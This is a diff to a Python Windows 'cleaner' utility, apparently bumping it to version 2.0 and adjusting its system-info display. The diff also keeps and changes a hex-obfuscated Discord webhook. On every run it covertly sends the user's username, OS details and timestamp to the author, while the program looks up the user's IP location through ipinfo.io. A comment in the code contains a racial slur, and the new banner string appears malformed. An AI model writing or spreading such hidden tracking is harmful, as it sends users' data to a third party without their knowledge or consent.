@@ -175,14 +175,15 @@ try:
  if os.path.isfile(file_path):
   os.remove(file_path)
 except Exception as er:
+        print(er)
         print('network error, try again later')
         time.sleep(5)
         exit()
-#
+#--------------------------------------------------------------------------------------
 os.system("title checking for updates")
 #auto update
 try:
- vers ='1.9'
+ vers ='2.0'
  def updater():
       v = requests.get("https://pastebin.com/raw/w29LjVc2").text
       time.sleep(0.5)
@@ -211,7 +212,10 @@ except Exception as lk:
         print('network error, try again later')
         time.sleep(5)
         exit()
-########################################################################
+#------------------------------------------------------------------------------------------------------
+ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
+disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
+about = f"DISK: {disk}GB"
 idk = Path.cwd()
 k = ''
 ong = '"'
@@ -221,7 +225,7 @@ lol=(f"     [>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}
 version = sys.getwindowsversion()
 mo = '[>] using '+(platform.system()) + (platform.release())
 BY = 'by jotaro'
-LMAO = 'version 1.9'
+LMAO = 'version 2.0'
 req = httpx.get("https://ipinfo.io/json")
 if req.status_code == 200:
             data = req.json()
@@ -239,16 +243,15 @@ number = (psutil.virtual_memory())
 number = str(number)
 ramg = int(number[12])
 hostname=socket.gethostname() 
-path_to_file = fr'C:\Users\{username}\AppData\Roaming\{username} PYCLEANER.txt'  
+path_to_file = fr'C:\Users\{username}\AppData\Roaming\({username}) PYCLEANER disclaimer.txt'  
 IPAddr=socket.gethostbyname(hostname)  
 tools = os.getcwd()+"\\tools\\"
 if not os.path.exists(tools):
     os.mkdir(tools)
 __author__ = 'jotaro' 
-##############################################################################
+#---------------------------------------------------------------------------------------------------
 #i just wanna know how many people ran my shit dont spam my webhook nigga thats gay tho.
-webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41' )
-webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41', content='<@822132948769177620>', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
+webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41', content=' ', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
 embed = DiscordEmbed(title='pycleaner ', description = username +' used ur program damn ', color=dawg)
 embed.set_footer(text= mo + lol +' '+ti)
 webhook.add_embed(embed)
@@ -257,12 +260,12 @@ print(f"{Fore.RESET}[{Fore.RED}PYCLEANER{Fore.RESET}]"+'done')
 # THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
 ver = Center.XCenter('''
 by jotaro 
-██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ░░███╗░░░░░░█████╗░
-██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ░████║░░░░░██╔══██╗
-╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ██╔██║░░░░░╚██████║
-░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ╚═╝██║░░░░░░╚═══██║
-░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗░█████╔╝
-░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░''')
+██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ██████╗░░░░░█████╗░
+██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚════██╗░░░██╔══██╗
+╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░██║░░██║
+░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░██║░░██║
+░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗╚█████╔╝
+░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░'')
 
 os.system("title PRESS ENTER")
 
@@ -495,8 +498,8 @@ def fr():
         print('loc: '+loc)
         print(ramg,'gb ram')
         print('ur username is ' +   username)
-        print ('total gb: ',obj_Disk.total / (1024.0 ** 3)) , print ('used gb:',obj_Disk.used / (1024.0 ** 3))
-        print ('free gb:',obj_Disk.free / (1024.0 ** 3))
+        print(about)
+        print ('free gb:',obj_Disk.free / (1024 ** 3))
         print ('%: ',obj_Disk.percent)
         print('RAM memory % used:', psutil.virtual_memory()[2])
         print(f'{Fore.RESET}{Fore.RED}hit enter {Fore.RESET}{Fore.GREEN}to go back')
